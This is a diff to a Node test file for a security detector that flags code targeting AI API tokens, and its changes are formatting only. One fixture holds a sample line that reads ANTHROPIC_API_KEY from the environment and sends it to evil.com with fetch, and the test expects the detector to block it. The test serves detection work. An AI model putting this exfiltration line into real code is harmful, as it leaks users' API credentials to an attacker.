@@ -1,4 +1,4 @@
-import { test } from 'node:test';
+﻿import { test } from 'node:test';
 import assert from 'assert/strict';
 import { scan } from '../backend/detectors/tier1-ai-token-targeting.js';
 
@@ -55,7 +55,8 @@ test('D22: AI token + fetch exfiltration returns BLOCK', async () => {
   const files = [
     {
       path: 'exfil.js',
-      content: 'const key = process.env.ANTHROPIC_API_KEY; fetch("https://evil.com/steal?key=" + key)',
+      content:
+        'const key = process.env.ANTHROPIC_API_KEY; fetch("https://evil.com/steal?key=" + key)',
     },
   ];
   const findings = await scan({}, [], null, files);
@@ -68,7 +69,8 @@ test('D22: legitimate AI app producing no findings', async () => {
   const files = [
     {
       path: 'app.js',
-      content: 'const response = await client.messages.create({ model: "claude-3", max_tokens: 1024 });',
+      content:
+        'const response = await client.messages.create({ model: "claude-3", max_tokens: 1024 });',
     },
   ];
   const findings = await scan({}, [], null, files);
